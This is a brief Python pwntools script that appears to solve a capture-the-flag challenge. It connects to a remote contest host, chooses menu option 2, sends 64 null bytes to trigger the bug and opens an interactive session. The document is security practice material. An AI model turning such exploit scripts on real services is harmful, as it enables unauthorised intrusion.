from pwn import *

#p = process("./main")
p = remote("pwn-disturbing-the-peace.c1-test-607b0199.blahaj.sg", 25877)

p.sendlineafter(b"YOUR INPUT > ", b'2')
p.sendlineafter(b" > ", b"\00" * 64)
p.interactive()

